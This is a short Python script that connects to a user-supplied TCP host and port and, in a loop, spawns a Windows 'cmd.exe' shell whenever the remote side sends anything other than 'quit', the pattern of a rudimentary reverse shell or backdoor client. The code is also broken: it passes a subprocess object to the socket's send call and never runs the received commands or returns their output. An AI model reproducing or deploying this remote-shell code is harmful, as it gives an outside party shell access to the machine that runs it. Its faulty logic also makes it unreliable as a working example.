import socket
import subprocess
def ConnectToTcpServer(x,y):
    c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host=x
    port=y
    server=(host,port)
    c.connect(server)
    msg="hello server"
    c.send(msg.encode("utf-8"))
    while True:
        data=c.recv(2048).decode("utf-8")
        if data=='quit':
            break
        else:
            c.send(subprocess.Popen("cmd.exe",shell=True))
            
        
        
    
    #print(data)
    #c.close()
    
    
    
    

serveraddr=input("Enter address of server to connect")
serverport=int(input("Enter port of that TCP Server to connect"))

ConnectToTcpServer(serveraddr,serverport)

    



    
